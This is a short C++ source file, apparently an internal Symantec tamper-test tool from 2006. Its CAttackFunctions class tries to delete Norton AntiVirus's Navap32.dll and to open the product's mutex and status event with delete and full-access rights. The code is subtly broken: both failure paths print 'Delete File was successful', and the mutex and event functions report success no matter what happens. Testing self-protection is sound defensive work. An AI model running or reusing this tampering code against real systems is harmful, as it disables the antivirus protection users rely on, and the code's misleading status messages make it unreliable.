////////////////////////
//
// PROPRIETARY / CONFIDENTIAL.
// Use of this product is subject to license terms.
// Copyright © 2006 Symantec Corporation.
// All rights reserved.
//
/////////////////////////////////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include ".\attackfunctions.h"
#include <windows.h>

#define NAV_FILE "C:\\Program Files\\Norton AntiVirus\\Navap32.dll"
#define NAV_MUTEX "NAV_Integrator_Plugin_Mutex"
#define NAV_EVENT "SYM_REFRESH_AP_STATUS_EVENT"
CAttackFunctions::CAttackFunctions(void)
{
}

CAttackFunctions::~CAttackFunctions(void)
{
}

bool CAttackFunctions::OpenSymFile()
{
	if(GetFileAttributes(NAV_FILE) == INVALID_FILE_ATTRIBUTES)
	{
		fprintf(stdout, _T("Delete File was successful"));
		return false;
	}

	if(!DeleteFile(NAV_FILE))
	{
		fprintf(stdout, _T("Delete File was successful"));
		return false;
	}
	return true;
}

bool CAttackFunctions::ModifyMutex()
{
	OpenMutex(DELETE, FALSE, NAV_MUTEX);
	return true;
}


bool CAttackFunctions::ModifyEvent()
{
	OpenEvent(EVENT_ALL_ACCESS, FALSE, NAV_EVENT);
	return true;
}